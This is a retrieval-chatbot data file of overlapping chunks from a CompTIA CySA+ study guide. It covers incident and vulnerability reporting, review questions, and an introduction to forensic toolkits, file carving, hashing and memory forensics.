rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	on a report in many cases and may benefit from granular reporting describing types of incidents as well as their impact and scope. Alert volume is less frequently used because it is difficult to ascribe meaning to a given volume. It may mean organizations have not properly tuned their alerts, it may mean Incident Response Reporting and Communication 437 that the organization has few effective alerts, or it could also mean that the organization has an effective detection system and has tuned their alerts and that only critical alerts are raised. Thus, relying on alert volume as a metric or KPI is often seen as a flawed measure. A more useful measure would be whether alerts occurred for incidents and resulted in the IR process activating or if incidents were discovered in other ways, meaning that alerts were not properly configured to discover them. Organizations seeking to implement metrics and KPIs need to understand both what they are measuring and why they are measuring it. Simply providing numbers without meaningful context or a process to use the metrics and KPIs will not serve to improve incident response processes and reporting and may actually consume resources that are needed elsewhere. Incident Response Reporting Incident response reports help organizations to communicate about incidents and also serve as a means of ensuring consistency in response, analysis, and tracking over time. Depending on organizational needs and the complexity of the incident, reports may be relatively short summaries or may have in-­depth detail included in the report or as attachments and appendices. Standardized reporting forms, processes, and follow-­up procedures help organizations respond in consistent ways. Figure 12.2 shows an example of an incident report template provided by the U.S. Department of Homeland Security and the CISA. The template includes sections describing impacted systems and software as well as the individual or team who prepared the report. The CISA provides a guide for incident management, including reporting processes. You can find the guide, including the full version of the form shown in Figure 12.2, at www.cisa.gov/uscert/sites/default/ files/c3vp/crr_resources_guides/CRR_Resource_Guide-­IM.pdf. There are a number of major IR report components that you’ll need to be aware of for the CySA+ exam. These include the following items: ■■ ■■ ■■ ■■ Most reports start with an executive summary, which provides a short, clearly written explanation of the incident, its impact, and its current state or resolution. The narrative provided for the report must describe information commonly called the 5 W’s: who, what, when, where, and why. Recommendations are frequently based on lessons learned, including documenting what went well, what could be improved, and what corrective actions need to be taken. A timeline of the event is frequently included to outline what happened and when. Timelines help establish areas for improvement by pointing out when actions were not accomplished in a timely manner or where there was a lag in response. They can also point out attacker methodologies and other useful information about the processes and techniques used during the incident by
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	report must describe information commonly called the 5 W’s: who, what, when, where, and why. Recommendations are frequently based on lessons learned, including documenting what went well, what could be improved, and what corrective actions need to be taken. A timeline of the event is frequently included to outline what happened and when. Timelines help establish areas for improvement by pointing out when actions were not accomplished in a timely manner or where there was a lag in response. They can also point out attacker methodologies and other useful information about the processes and techniques used during the incident by both attackers and defenders. Chapter 12 438 FIGURE 12.2 ■ Reporting and Communication Sample incident response report Appendix D. Example Incident Reporting Template <Organization Name> Incident Reporting Template Date: Name of individual completing this form: Tracking number: Incident Priority HIGH Additional notes: MEDIUM Check all that apply. Compromised System Compromised User Credentials (e.g., lost password) Network Attack (e.g., DoS) Malware (e.g., virus, worm, Trojan) Reconnaissance (e.g., scanning, sniffing) Incident description notes: Please provide as much detail as possible. A. Date and time when the incident was discovered B. Date and time when the incident was reported C. Date and time when the incident occurred Additional timeline details: LOW OTHER Incident Type Lost Equipment/Theft Physical Break-in Social Engineering (e.g., Phishing) Law Enforcement Request Policy Violation (e.g., acceptable use) Unknown/Other (Please describe below.) Incident Timeline Summary ■■ ■■ ■■ 439 Impact assessment information helps organizations understand what the outcome of an incident was and what issues may need to be resolved. This may include financial, reputational, or other damages. Scope describes what systems, services, and other elements of the organization were impacted by the organization. Evidence gathered during the investigation is often attached as an appendix, but it may also be summarized as part of the report, where it provides helpful contextual information about the incident. Summary Reporting and communications are important elements in a cybersecurity analyst’s skillset. Vulnerability management reports typically include items like the vulnerability name and description, a list of affected hosts, a risk score, mitigation options, information about recurrence of the vulnerability, and prioritization information to help ensure that the most important vulnerabilities are addressed first. Additional communications and reporting actions are also taken to ensure vulnerability management is successful. These include the creation of compliance reports, often driven by regulatory or contractual compliance requirements. Action plans are created to document how and when patching and remediation will occur. Configuration management and patching tools and systems will provide reports to demonstrate success or failure of patching efforts. Metrics and KPIs are then tracked to ensure that vulnerability management efforts are achieving their desired goals. Trends, top 10 lists, critical vulnerability lists, and service level objectives are all used as part of this process. Despite their best efforts, organizations often encounter inhibitors to remediation. Security analysts need to account for the impact that MOUs and SLAs may have on an organization’s ability to patch in a timely manner while
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	created to document how and when patching and remediation will occur. Configuration management and patching tools and systems will provide reports to demonstrate success or failure of patching efforts. Metrics and KPIs are then tracked to ensure that vulnerability management efforts are achieving their desired goals. Trends, top 10 lists, critical vulnerability lists, and service level objectives are all used as part of this process. Despite their best efforts, organizations often encounter inhibitors to remediation. Security analysts need to account for the impact that MOUs and SLAs may have on an organization’s ability to patch in a timely manner while still complying with uptime targets. Organizational governance can impede patching, particularly if patches might cause a business process interruption or result in degraded functionality. Finally, legacy systems and proprietary systems both may be unable to be patched, requiring compensating controls. Communication also occurs throughout incident response processes from identification to declaration, response, escalation, and resolution. Responders need to know who stakeholders are in the process and when those stakeholders should be involved. Communications also need to take into account how and when communication should involve legal counsel, public relations efforts with customers and the media, regulatory reporting, and law enforcement. Once an incident is resolved, root cause analysis and lessons learned processes help ensure that the organization will use what it learned from the incident to improve. Metrics and KPIs, including the mean time to detect, mean time to respond, and mean time to remediate, all help hold leadership and responders accountable for timely responses. 440 Chapter 12 ■ Reporting and Communication Exam Essentials Understand vulnerability management reporting. Vulnerability reporting includes common elements like the CVE number and CVSS score, name, description, affected hosts, mitigation options, information about recurrence, and prioritization information. They need to be sent to the proper stakeholders in a regular and timely manner. Specific report types like compliance reports may be sent where appropriate. Action plans are then prepared to address the reports and may include configuration management, patching, compensating controls, awareness, education and training, and business requirement information. Explain vulnerability management metrics and KPIs. Trend data is used to determine whether a program is successful or if new issues are becoming systemic problems. Top 10 lists can help identify the most common vulnerabilities and thus help focus effort. Critical vulnerability lists also help with focus on the most dangerous vulnerabilities. Tracking zero-­day vulnerabilities is challenging in reporting but may be required by leadership. Finally, service level objectives (SLOs) are set to define timely remediation goals and to determine if the organization is meeting them. Describe inhibitors to remediation. Memorandums of understanding (MOUs) and service level agreements (SLAs) define performance or uptime targets and may conflict with patching due to systems or services needing to be taken offline. Organizational governance may introduce slowdowns or additional requirements that impact patching. Concerns about business process interruption or degraded functionality due to patching may also impact patching. Finally, legacy systems and proprietary systems may not have patches available or
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	in reporting but may be required by leadership. Finally, service level objectives (SLOs) are set to define timely remediation goals and to determine if the organization is meeting them. Describe inhibitors to remediation. Memorandums of understanding (MOUs) and service level agreements (SLAs) define performance or uptime targets and may conflict with patching due to systems or services needing to be taken offline. Organizational governance may introduce slowdowns or additional requirements that impact patching. Concerns about business process interruption or degraded functionality due to patching may also impact patching. Finally, legacy systems and proprietary systems may not have patches available or patches may not be able to be installed while retaining support. Understand critical stakeholders for incident response. Stakeholders must be identified to ensure appropriate incident communication and reporting, and they need to be involved in incident declaration and escalation. Communications may need to involve legal, public relations with customers and media, regulatory reporting, and law enforcement. List critical items for incident response reports. Incident reports typically include executive summaries to describe the incident in an easily digestible, short form. They also must include who, what, when, where, and why information about the incident. Information about the impact, scope, and timeline, recommendations for improvement, and evidence related to the incident are also all commonly included. Root cause analyses help drive improvement to avoid future incidents of a similar nature. Describe incident response metrics and KPIs. Mean time to detect, mean time to respond, and mean time to remediate can all be useful information when attempting to assess the effectiveness of an incident response program. Measuring alert volume is less likely to provide useful data but may be requested by management. Lab Exercises 441 Lab Exercises Activity 12.1: Vulnerability Management Reporting In Activity 6.2 you ran a vulnerability scan, and in Activity 7.1 you analyzed that scan to consider a remediation plan. Using those results, prepare a vulnerability scan report that you could provide to a department head or other senior leader about the scan and the remediation required. 1. Describe what vulnerabilities are critical, and why. 2. Identify any vulnerabilities where compensating controls may be appropriate. 3. Choose one vulnerability and assume that it has recurred since the last report was run. How would you describe this in a report to management? 4. What inhibitors to remediation would you anticipate, and how would you address them in a written report to management? Activity 12.2: Review a Public Incident Report In this exercise you will review a publicly available incident report. 1. Find a recent, publicly published incident report. Two examples to consider as starting points are as follows: ■■ ■■ 2. Microsoft’s DEV-­0357 intrusion (www.microsoft.com/en-­us/security/ blog/2022/03/22/dev-­0537-­criminal-­actor-­targeting-­organizations-­ for-­data-­exfiltration-­and-­destruction) Consider the following questions: ■■ ■■ ■■ ■■ ■■ 3. LastPass’s 2022 security breach notification (https://blog.lastpass .com/2022/12/notice-­of-­recent-­security-­incident) Does the notification contain all the information that a customer would need? Is there public commentary on the announcement? If so, what tone does that commentary take? Is there a follow-­up report? When was it released? Did
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	management? Activity 12.2: Review a Public Incident Report In this exercise you will review a publicly available incident report. 1. Find a recent, publicly published incident report. Two examples to consider as starting points are as follows: ■■ ■■ 2. Microsoft’s DEV-­0357 intrusion (www.microsoft.com/en-­us/security/ blog/2022/03/22/dev-­0537-­criminal-­actor-­targeting-­organizations-­ for-­data-­exfiltration-­and-­destruction) Consider the following questions: ■■ ■■ ■■ ■■ ■■ 3. LastPass’s 2022 security breach notification (https://blog.lastpass .com/2022/12/notice-­of-­recent-­security-­incident) Does the notification contain all the information that a customer would need? Is there public commentary on the announcement? If so, what tone does that commentary take? Is there a follow-­up report? When was it released? Did it change the information provided in the initial report? What actions does the organization intend to take? Are they appropriate or sufficient? Was law enforcement involved? Consider your own organization’s incident response process and reporting process. What would your organization’s public incident report for a similar event contain? Where would it be different, and if so, why? Chapter 12 442 ■ Reporting and Communication Activity 12.3: Incident Reporting In this exercise you will fill out a sample incident report based on an incident you have experienced. If you’ve never experienced an incident, you can simply review the form and consider what you would want to know for an incident in an organization that you are familiar with. 1. Download the guide found at www.cisa.gov/uscert/sites/default/files/ c3vp/crr_resources_guides/CRR_Resource_Guide-­IM.pdf. 2. Identify an incident whose response you have been involved with or are aware of. 3. Fill out the form based on the incident. 4. Consider the following questions: ■■ What information are you lacking? ■■ How would you gather that information? ■■ What was the root cause of the incident? ■■ What lessons did your organization learn? ■■ What controls or changes would you recommend based on those lessons? Review Questions 443 Review Questions 1. 2. 3. 4. 5. 6. Why should organizations predetermine communication guidelines according to NIST? A. To limit how many individuals know sensitive incident information B. To ensure compliance with federal law C. To ensure that appropriate communications are shared with the right parties D. To ensure consistency of communications Valentine is preparing a vulnerability management report. What data point will provide the greatest help in determining if patching programs are not succeeding? A. A list of affected hosts B. Information about recurrence C. Prioritization information D. Risk scores Jake wants to identify stakeholders for vulnerability management communications. Which stakeholder group is most likely to want information to be available via an API instead of a written communication? A. Security operations and oversight stakeholders B. Audit and compliance stakeholders C. System administration stakeholders D. Management stakeholders What phase of the NIST IR cycle does communication to stakeholders occur in? A. Detection and Analysis B. Containment, Eradication, and Recovery C. Post-­Incident Activity D. All cycles include communication with stakeholders. Which of the following potential incident response metrics is least useful in understanding the organization’s ability to respond to incidents? A. Mean time to detect B. Alert volume C. Mean time to
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	group is most likely to want information to be available via an API instead of a written communication? A. Security operations and oversight stakeholders B. Audit and compliance stakeholders C. System administration stakeholders D. Management stakeholders What phase of the NIST IR cycle does communication to stakeholders occur in? A. Detection and Analysis B. Containment, Eradication, and Recovery C. Post-­Incident Activity D. All cycles include communication with stakeholders. Which of the following potential incident response metrics is least useful in understanding the organization’s ability to respond to incidents? A. Mean time to detect B. Alert volume C. Mean time to respond D. Mean time to remediate Why might a service level agreement cause an organization to delay patching? A. To force vendor compliance B. To remain compliance with licensing C. To achieve organizational governance targets D. To meet performance targets defined by the SLA Chapter 12 444 7. 8. 9. ■ Reporting and Communication Ian wants to ensure that patches are installed as part of a baseline for his organization. What type of tool should he invest in as part of his overall action plan for remediation? A. A vulnerability scanner B. A configuration management tool or system C. A baseline configuration scanner D. An endpoint detection and response (EDR) tool Sally is preparing an incident response report. What part of the report is intended to help organizations understand the outcome of the incident and financial, reputational, or other damages? A. The impact assessment B. The timeline C. The scope D. The recommendations Jaime is concerned that her organization may face multiple inhibitors to remediation. Which of the following inhibitors to remediation is most often associated with performance or uptime targets? A. Organizational governance B. Legacy systems C. Memorandums of understanding D. Proprietary systems 10. Selah wants to include sections of relevant logs in her incident report. What report section most frequently includes logs? A. In the timeline B. As part of the executive summary C. As evidence in the appendix D. As part of the recommendations 11. Danielle has completed her incident report and wants to ensure that her organization benefits from the process. What exercise is most frequently conducted after the report to improve future IR processes? A. Media training B. Government compliance reporting C. A lessons learned exercise D. A mandatory report to auditors 12. What phase of the IR cycle does media training typically occur in? A. Preparation B. Detection and Analysis C. Containment, Eradication, and Recovery D. Post-­Incident Activity Review Questions 445 13. Michelle is performing root cause analysis. Which of the following is not one of the four common steps in an RCA exercise? A. Documenting the root cause analysis using a chart or diagram B. Establishing a timeline of events C. Determining which individual or team was responsible for the problem D. Identifying the problems and events that occurred during the event and describing them as completely as possible 14. The organization that Charles works for has experienced a significant incident. Which of
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	A. Preparation B. Detection and Analysis C. Containment, Eradication, and Recovery D. Post-­Incident Activity Review Questions 445 13. Michelle is performing root cause analysis. Which of the following is not one of the four common steps in an RCA exercise? A. Documenting the root cause analysis using a chart or diagram B. Establishing a timeline of events C. Determining which individual or team was responsible for the problem D. Identifying the problems and events that occurred during the event and describing them as completely as possible 14. The organization that Charles works for has experienced a significant incident. Which of the following is most likely to require the organization to report the incident in a specific timeframe? A. Organizational policy B. Internal governance C. Regulatory compliance D. Media requirements 15. After testing, Jim’s team has determined that installing a patch will result in degraded functionality due to a service being modified. What should Jim suggest to address this inhibitor to remediation? A. Take the change through organizational governance. B. Identify a compensating control. C. Replace the legacy system. D. Update the service level agreement. 16. Which of the following is not a NIST-­recommended practice to help with media communication procedures? A. Avoiding media contact throughout IR processes B. Establishing procedures for briefing the media C. Maintaining an IR status document or statement D. Media training 17. An incident report is typically prepared in what phase of the NIST incident response cycle? A. Detection and Analysis B. Post-­Incident Activity C. Preparation D. Containment, Eradication, and Recovery 18. The security team that Chris works on has been notified of a zero-­day vulnerability in Windows Server that was released earlier in the morning. Chris’s manager asks Chris to immediately check recent vulnerability reports to determine if the organization is impacted. What should Chris tell his manager? A. That the reports will need to be rerun to list the zero-­day vulnerability. B. He needs to update the vulnerability scanner to detect the zero-­day vulnerability. C. Zero-­day vulnerabilities won’t show in previously run vulnerability management reports. D. That zero-­day vulnerabilities cannot be detected. Chapter 12 446 ■ Reporting and Communication 19. Mikayla’s organization has identified an ongoing problem based on their vulnerability management dashboard reports. Trends indicate that patching is not occurring in a timely manner, and that patches are not being installed for some of the most critical vulnerabilities. What should Mikayla do if she believes that system administrators are not prioritizing patching? A. Engage in awareness, education, and training activities. B. Assess changing business requirements. C. Deploy compensating controls. D. Engage management to punish administrators who are not patching. 20. Geeta’s organization operates a critical system provided by a vendor that specifies that the operating system cannot be patched. What type of solution should Geeta recommend when her vulnerability reporting shows the system is behind on patching and has critical vulnerabilities? A. Mark the vulnerabilities as unable to be remediated and continue operations to ensure business continuity. B. Shut off the system until
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	she believes that system administrators are not prioritizing patching? A. Engage in awareness, education, and training activities. B. Assess changing business requirements. C. Deploy compensating controls. D. Engage management to punish administrators who are not patching. 20. Geeta’s organization operates a critical system provided by a vendor that specifies that the operating system cannot be patched. What type of solution should Geeta recommend when her vulnerability reporting shows the system is behind on patching and has critical vulnerabilities? A. Mark the vulnerabilities as unable to be remediated and continue operations to ensure business continuity. B. Shut off the system until a solution can be identified. C. Install the operating system patch and test if it causes issues. D. Identify and deploy a compensating control. Chapter 13 Performing Forensic Analysis and Techniques for Incident Response THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 3.0: Incident Response and Management ■■ 3.2 Given a scenario, perform incident response activities. ■■ ■■ Detection and analysis 3.3 Explain the preparation and post-­incident activity phases of the incident management life cycle ■■ Post-­incident activity Computer forensic investigations are used to determine what activities, changes, and other actions have occurred on a system, who or what performed them, and what data is stored there. This means that computer forensic techniques are used in a variety of scenarios, including incident response, police investigations, inquiries into system administrator misuse, compromise and malware analysis, and investigations related to internal policy violations. While there are many reasons for forensic investigations, the CySA+ exam outline focuses on forensics in the context of incident response and post-­ incident activity. In this chapter, you will learn how to perform incident response activities and be able to explain the preparation and post-­activity phases of the incident management life cycle. You will also learn how to be prepared to conduct basic forensic investigations. You will learn about forensics kits, their contents, and the use of the devices and tools they contain. Then, you will explore forensic tools and processes needed to capture and preserve forensics data for network-­based, endpoint-­based, mobile, and cloud and virtual investigations. Building a Forensics Capability One of the first steps to being able to conduct a forensic investigation is to gather the right set of tools. Forensic tools come with a broad variety of capabilities, costs, and purposes. You should determine what types of investigations you are likely to conduct, what types of systems and devices you will need to analyze, and what evidentiary standards you will need to comply with before you build your toolkit. Exam Note The CySA+ exam outline focuses on containment, eradication, and recovery activities. In order to give you context for those activities, we’ll talk broadly about forensic activities, and then call out specific concepts like determining scope, impact, and root cause analysis as you explore forensics in this chapter. Building a Forensics Capability 449 Building a Forensic Toolkit A complete forensic toolkit is an important part of any forensic investigation.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	are likely to conduct, what types of systems and devices you will need to analyze, and what evidentiary standards you will need to comply with before you build your toolkit. Exam Note The CySA+ exam outline focuses on containment, eradication, and recovery activities. In order to give you context for those activities, we’ll talk broadly about forensic activities, and then call out specific concepts like determining scope, impact, and root cause analysis as you explore forensics in this chapter. Building a Forensics Capability 449 Building a Forensic Toolkit A complete forensic toolkit is an important part of any forensic investigation. Not only can having the right tools and materials make the process easier, but it can also help ensure that your investigation has the right documentation and support materials in case you need to provide proof of your process—­either in court, to management, or to auditors. Over the next few pages you will learn about the major components of a forensic toolkit, including a forensic workstation, data capture tools and devices, and the administrative tools that help provide proper chain of custody tracking. Keep in mind how your organization is likely to conduct forensic investigations—­not all of these components may be needed for your use cases. Key Toolkit Components The following components are common to most forensic toolkits. Forensic workstations may be a desktop, a laptop, or even a server, and the specific components should be tailored to your organization. But this basic set of items will allow you to perform forensic investigations under most circumstances. ■■ ■■ ■■ ■■ ■■ A digital forensics workstation. A good forensic workstation is designed to allow for data capture and analysis, and those tasks can benefit from a powerful, multicore CPU and plenty of RAM. Having lots of fast, reliable storage is also important, since large investigations can deal with terabytes of data. A forensic investigation suite or forensic software like FTK, EnCase, the SANS Investigative Forensic Kit (SIFT), or The Sleuth Kit (TSK) that provides the ability to capture and analyze forensic images as well as track forensic investigations. Write blockers, which ensure that drives connected to a forensic system or device cannot be written to. This helps to ensure the integrity of the forensic investigation; having file access times changed—­or worse, having the system that is analyzing the data modify the content of the files on the drive—­can prevent forensic evidence from being useful. Forensic drive duplicators, which are designed to copy drives for forensic investigation and then provide validation that the original drive and the content of the new drive match. Many forensic tools and suites also offer this capability, but a dedicated cloning device can be useful (and can sometimes make it easier to prove that the duplication process was completed in a forensically sound manner). Wiped drives and wiped removable media of sufficient capacity to handle any drive or system that you are likely to encounter. Fortunately, large SATA hard drives, portable NAS devices, and large SSDs make
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	from being useful. Forensic drive duplicators, which are designed to copy drives for forensic investigation and then provide validation that the original drive and the content of the new drive match. Many forensic tools and suites also offer this capability, but a dedicated cloning device can be useful (and can sometimes make it easier to prove that the duplication process was completed in a forensically sound manner). Wiped drives and wiped removable media of sufficient capacity to handle any drive or system that you are likely to encounter. Fortunately, large SATA hard drives, portable NAS devices, and large SSDs make it a lot easier to capture and transport multiple forensic images. Removable media, in the form of large USB thumb drives, writable Blu-­ ray or DVD media, or flash media, can also be valuable for transporting forensic data or for sending it to other organizations when necessary. 450 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response Properly wiping the media to ensure that you don’t have any remnant data is crucial—­remnant data can call your entire forensic process into question! It is particularly important to understand how wear leveling on flash media and SSDs can impact data remanence. ■■ ■■ ■■ ■■ Cables and drive adapters of various types to ensure that you can connect to most types of devices you are likely to encounter. In a corporate environment, you are likely to know what types of machines and drives your organization deploys, allowing you to select the right adapters and cables to match what you have. In law enforcement, consulting, or another environment where you may not know what you will encounter, having a broad selection of cables and adapters can be incredibly helpful. A camera to document system configurations, drive labels, and other information. Cameras are a surprisingly important part of forensic capture because they can speed up data recording and can provide a visual record of the state of a system or device. Labeling and documentation tools, including a label maker or labels, indelible pens, and other tools to help with chain of custody and forensic process documentation. Notebooks and preprepared documentation forms and checklists to record forensic investigation processes and notes. Common types of forms include chain of custody forms that track who was in possession of evidence at any time, incident response forms for tracking a response process, incident response plans and incident forms, and escalation lists or call lists of people to contact during a response process. These are sometimes replaced by a forensic recording software package or another software tool that provides ways to validate log entries and that tracks changes. Figure 13.1 shows an example of a chain of custody form. Understanding Forensic Software There are many types of forensic software, ranging from purpose-­built forensic suites and tools like FTK, EnCase, CAINE, Autopsy, and SIFT to forensic utilities like DumpIt and Memoryze. Many common Linux and Windows utilities also have forensic applications, including utilities like dd and WinDbg. Capabilities
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	incident forms, and escalation lists or call lists of people to contact during a response process. These are sometimes replaced by a forensic recording software package or another software tool that provides ways to validate log entries and that tracks changes. Figure 13.1 shows an example of a chain of custody form. Understanding Forensic Software There are many types of forensic software, ranging from purpose-­built forensic suites and tools like FTK, EnCase, CAINE, Autopsy, and SIFT to forensic utilities like DumpIt and Memoryze. Many common Linux and Windows utilities also have forensic applications, including utilities like dd and WinDbg. Capabilities and Application Forensic investigations can take many forms, which means that you’ll need a broad software toolkit to handle situations, systems, and specific requirements you encounter. Key forensic tool capabilities to include in your forensic software toolkit are imaging, analysis, hashing and validation, process and memory dump analysis, password cracking, and log viewers. Understanding Forensic Software FIGURE 13.1 Sample chain of custody form 451 Chapter 13 452 ■ Performing Forensic Analysis and Techniques for Incident Response Imaging Media and Drives The first step in many forensic investigations is to create copies of the media or disks that may contain data useful for the investigation. This is done using an imaging utility, which can create a forensic image of a complete disk, a disk partition, or a logical volume. Forensic images exactly match the original source drive, volume, partition, or device, including slack space and unallocated space. Slack space is the space left when a file is written. This unused space can contain fragments of files previously written to the space or even files that have been intentionally hidden. Unallocated space is space that has not been partitioned. When used properly, imaging utilities ensure that you have captured all of this data. Forensic copies and drive wiping programs may not properly handle spare sectors and bad sectors on traditional spinning disks or reserved space retained to help with wear leveling for SSDs. This means it is possible to miss potentially useful forensic data, and it’s something you should be particularly aware of when wiping disks. Analysis Utilities Forensic analysis utilities provide a number of useful capabilities that can help offer insight into what occurred on a system. Examples include the following: ■■ Timelines of system changes ■■ Validation tools that check known-­good versions of files against those found on a system ■■ Filesystem analysis capabilities that can look at filesystem metadata (like the Windows Master File Table for NTFS) to identify file changes, access, and deletions ■■ File carving tools that allow the recovery of files without the filesystem itself available ■■ Windows Registry analysis ■■ Log file parsing and review These analysis tools can help identify information that is useful for a forensic investigation, but using them well requires detailed forensic knowledge to avoid missing important data. Some forensic investigators use open source utilities like SIFT, CAINE, and Autopsy since they are freely available. Although commercial forensic tools can be
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	■■ Filesystem analysis capabilities that can look at filesystem metadata (like the Windows Master File Table for NTFS) to identify file changes, access, and deletions ■■ File carving tools that allow the recovery of files without the filesystem itself available ■■ Windows Registry analysis ■■ Log file parsing and review These analysis tools can help identify information that is useful for a forensic investigation, but using them well requires detailed forensic knowledge to avoid missing important data. Some forensic investigators use open source utilities like SIFT, CAINE, and Autopsy since they are freely available. Although commercial forensic tools can be costly, they may be easier to defend in court, which means you’ll sometimes see professional forensic investigators using commercial tools like FTK or EnCase rather than freely available open source tools. Make sure your organization is comfortable with the pros and cons of any tool that you choose to use. Carving When data is recovered as part of forensic analysis, the original filesystem may no longer be intact. In this, and other scenarios where the original filesystem cannot be used, file carving Understanding Forensic Software 453 tools come in handy. File carving tools look at data on a block-­by-­block basis, looking for information like file headers and other indicators of file structure. When they find them, they attempt to recover complete or even partial files. Three common types of file carving methods are as follows: ■■ ■■ ■■ Header-­and footer-­based carving, which focuses on headers like those found in JPEG files. For example, JPEGs can be found by looking for \xFF\xD8 in the header and \xFF\xD9 in the footer. Content-­based carving techniques look for information about the content of a file such as character counts and text recognition. File structure-­based carving techniques that use information about the structure of files. Figure 13.2 shows a JPEG file opened in HxD, a free hex editor tool. At the top left of the image you can see the header information for the JPEG showing FF and D8 as the first pair of entries in the file. FIGURE 13.2 Carving a JPEG file using HxD 454 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response Chain of Custody Tracking Support for properly maintaining chain of custody documentation in an automated and logged manner is an important part of a forensic suite, and it is an important part of their documented forensic procedures for many organizations. Maintaining chain of custody documentation ensures that drive images and other data, as well as the actions taken using the suite, are properly validated and available for review, thus reducing the potential for legal challenges based on poor custodial practices. Hashing and Validation Verification of the forensic integrity of an image is an important part of forensic imaging. Fortunately, this can be done using hashing utilities built into a forensics suite or run independently to get a hash of the drive to validate the contents of the copy. The goal of this process is to ensure that
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	for many organizations. Maintaining chain of custody documentation ensures that drive images and other data, as well as the actions taken using the suite, are properly validated and available for review, thus reducing the potential for legal challenges based on poor custodial practices. Hashing and Validation Verification of the forensic integrity of an image is an important part of forensic imaging. Fortunately, this can be done using hashing utilities built into a forensics suite or run independently to get a hash of the drive to validate the contents of the copy. The goal of this process is to ensure that the copy exactly matches the source drive or device. Forensic image formats like EnCase’s EO1 format provide built-­in hashing as part of the file. In cases where formats like these are not used, both MD5, SHA1, and SHA2 hashes are frequently used for this purpose. Hashing large drives can take quite a bit of time even using a fast algorithm like MD5, but the process itself is quite simple, as shown here. The following provides the MD5 hash of a volume mounted on a Linux system: user@demo:~# md5sum /dev/sda1 9b98b637a132974e41e3c6ae1fc9fc96 /dev/sda1 To validate an image, a hash is generated for both the original and the copy. If the hashes match, the images are identical. Both hashes should be recorded as part of the forensic log for the investigation. You may be wondering why MD5 and SHA1 are used for forensic imaging when most security practitioners recommend against using it. MD5 remains in use because it is fast and widely available, and the attacks against MD5 are primarily threats for reasons that don’t apply to forensic images. SHA1 is in use for similar reasons—­long established habits and practices combined with a relatively low risk of abuse. As a practitioner, you are unlikely to encounter someone who can or would intentionally make two drives with different contents hash to the same value. Hashing is also often used to validate binaries and other application related-files to detect changes to the binaries. Manual checksums using MD5 or SHA1 utilities can be used to check if a file matches a known good version or one from a backup, or it can be checked against a provided checksum from a vendor or other source. Exam Note Hashing shows up in Exam Objective 1.3, so make sure you think about how you would respond to questions about hashes on the exam. Conducting Endpoint Forensics 455 Fortunately for incident responders and forensic analysts, known file hash databases are maintained by a handful of organizations, including the NIST National Software Reference Library, which includes the Reference Data Set with digital signatures for software: www.nist.gov/itl/ssd/software-­quality-­group/ national-­software-­reference-­library-­nsrl. Many organizations also track known hashes of malware, allowing responders to upload suspected malicious code to have it checked. What’s a binary? The term is used to describe files that aren’t text files, which typically means executable applications in common use but might mean a variety of other types of files as well. The
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	hashes on the exam. Conducting Endpoint Forensics 455 Fortunately for incident responders and forensic analysts, known file hash databases are maintained by a handful of organizations, including the NIST National Software Reference Library, which includes the Reference Data Set with digital signatures for software: www.nist.gov/itl/ssd/software-­quality-­group/ national-­software-­reference-­library-­nsrl. Many organizations also track known hashes of malware, allowing responders to upload suspected malicious code to have it checked. What’s a binary? The term is used to describe files that aren’t text files, which typically means executable applications in common use but might mean a variety of other types of files as well. The key concept is that they are machine readable but not human readable. You may still be able to pull some human-­readable text out using a utility like strings on a Linux system—­a useful forensic trick used by many incident responders. Conducting Endpoint Forensics Traditionally, the great majority of forensic activity has taken place on endpoint systems: servers, desktops, laptops, and mobile devices of all types. As organizations increasingly move to the cloud, more forensic activity is taking place there, but a majority of forensic work is likely to continue to involve traditional endpoints for most practitioners. Operating System, Process, and Memory Dump Analysis Information about the state of the operating system (OS), including the data that is stored in memory by processes, can be important to both forensic investigations as well as investigations of malware infections or compromise. Often data that is otherwise kept encrypted is accessible in memory to processes, or the encryption keys that those processes use to access encrypted data are available. The ability to capture memory, process information and data, as well as operate specific analysis capabilities, is a useful forensic capability. OS analysis can provide key data about what was occurring on a system during the timeframe targeted by an investigation. In addition to live memory capture and analysis, memory dump analysis can be particularly valuable when recovering decryption keys for full-­disk encryption products like BitLocker. Hibernation files and crash dumps can both contain the data needed to decrypt the drive, which makes accessing an unlocked machine critically important for a forensic practitioner. 456 Chapter 13 ■ Performing Forensic Analysis and Techniques for Incident Response Disk Forensics The most common forensic activity for endpoints is disk, or storage-­based analysis. This can range from manual inspection of files to complete imaging and analysis of entire disks or volumes as mentioned earlier in the chapter. We will walk you through a forensic scenario later in this chapter, including disk capture, so if you want to read more about disk forensics, skip ahead. Memory Forensics Conducting memory forensics requires either running live forensic analysis on a running machine or making a copy of live memory to point in time forensic memory analysis. Tools like Volatility, an open source memory forensics framework, can capture and analyze memory. Volatility has a wide range of plug-­in commands, including the ability to detect API hooks, read the keyboard buffer, grab the Windows
